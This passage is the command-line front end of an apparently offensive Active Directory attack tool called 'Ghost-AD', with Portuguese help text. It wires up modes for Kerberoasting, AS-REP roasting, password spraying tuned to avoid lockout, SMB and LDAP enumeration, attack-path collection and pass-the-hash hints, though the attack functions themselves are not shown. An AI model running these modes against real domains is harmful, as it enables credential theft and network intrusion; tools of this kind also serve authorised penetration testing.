    p_ldap.add_argument("-u", "--user", help="Usuario autenticado (opcional)")
    p_ldap.add_argument("-p", "--password", help="Senha do usuario")

    # Modo KERB
    p_kerb = sub.add_parser("kerb", help="Kerberoasting — contas com SPN (solicitar TGS)")
    p_kerb.add_argument("--dc", required=True)
    p_kerb.add_argument("--domain", required=True)
    p_kerb.add_argument("-u", "--user", help="Usuario autenticado")
    p_kerb.add_argument("-p", "--password")

    # Modo ASREP
    p_asrep = sub.add_parser("asrep", help="AS-REP Roasting — usuarios sem pre-autenticacao")
    p_asrep.add_argument("--dc", required=True)
    p_asrep.add_argument("--domain", required=True)
    p_asrep.add_argument("--users-file", help="Lista de usuarios para testar (um por linha)")

    # Modo SPRAY
    p_spray = sub.add_parser("spray", help="Password spray com deteccao de lockout")
    p_spray.add_argument("--dc", required=True)
    p_spray.add_argument("--domain", required=True)
    p_spray.add_argument("--users-file", required=True, help="Arquivo com lista de usuarios")
    p_spray.add_argument("-p", "--password", required=True, help="Senha a testar")
    p_spray.add_argument("--lockout", type=int, default=3,
                         help="Threshold de lockout estimado (padrao: 3)")
    p_spray.add_argument("--delay", type=float, default=1.0,
                         help="Delay em segundos entre tentativas (padrao: 1.0)")

    # Modo SMB
    p_smb = sub.add_parser("smb", help="Enumeracao SMB (shares, null session, signing)")
    p_smb.add_argument("--dc", required=True)
    p_smb.add_argument("--domain", default="WORKGROUP")
    p_smb.add_argument("-u", "--user")
    p_smb.add_argument("-p", "--password")

    # Modo BLOODHOUND
    p_bh = sub.add_parser("bloodhound", help="Coleta BloodHound-lite (JSON de paths de ataque)")
    p_bh.add_argument("--dc", required=True)
    p_bh.add_argument("--domain", required=True)
    p_bh.add_argument("-u", "--user")
    p_bh.add_argument("-p", "--password")
    p_bh.add_argument("--output", default="bloodhound_lite.json", help="Arquivo de saida JSON")

    # Modo PTH
    p_pth = sub.add_parser("pth", help="Hints de Pass-the-Hash e Pass-the-Ticket")
    p_pth.add_argument("--dc", required=True)
    p_pth.add_argument("--domain", required=True)
    p_pth.add_argument("-u", "--user", default="administrator")
    p_pth.add_argument("--hash", dest="hash_nt", help="Hash NTLM do usuario alvo")

    # Opcoes globais
    for p in [p_ldap, p_kerb, p_asrep, p_spray, p_smb, p_bh]:
        p.add_argument("-v", "--verbose", action="store_true", help="Saida detalhada")
    for p in [p_ldap, p_kerb, p_asrep, p_spray, p_smb]:
        p.add_argument("--output", help="Salvar resultados em JSON")

    args = parser.parse_args()

    if not args.modo:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    print(BANNER)

    resultados = {"modo": args.modo, "timestamp": datetime.now(timezone.utc).isoformat()}

    if args.modo == "ldap":
        r = ldap_enum(args.dc, args.domain, user=args.user, password=args.password,
                      verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "kerb":
        r = kerberoast(args.dc, args.domain, user=args.user, password=args.password,
                       verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "asrep":
        users = None
        if hasattr(args, "users_file") and args.users_file:
            try:
                with open(args.users_file, "r") as f:
                    users = [l.strip() for l in f if l.strip()]
            except Exception as e:
                _log(f"Erro ao ler users-file: {e}", "ERRO")
        r = asrep_roast(args.dc, args.domain, users=users, verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "spray":
        try:
            with open(args.users_file, "r") as f:
                users = [l.strip() for l in f if l.strip()]
        except Exception as e:
            _log(f"Erro ao ler users-file: {e}", "ERRO")
            sys.exit(1)
        r = password_spray(args.dc, args.domain, users, args.password,
                           lockout_threshold=args.lockout, delay=args.delay,
                           verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "smb":
        r = smb_enum(args.dc, args.domain, user=args.user, password=args.password,
                     verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "bloodhound":
        r = bloodhound_lite(args.dc, args.domain, user=args.user, password=args.password,
                             output_file=args.output, verbose=args.verbose)
        resultados.update(r)

    elif args.modo == "pth":
        pth_ptt_hints(args.domain, args.dc, user=args.user, hash_nt=args.hash_nt)

    if hasattr(args, "output") and args.output and args.modo != "bloodhound":
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump(resultados, f, indent=2, ensure_ascii=False, default=str)
            _log(f"Resultados salvos: {args.output}", "OK")
        except Exception as e:
            _log(f"Erro ao salvar: {e}", "ERRO")

    print(f"\n  {C['G']}{C['N']}[+] Ghost-AD finalizado.{C['X']}\n")


if __name__ == "__main__":
    main()
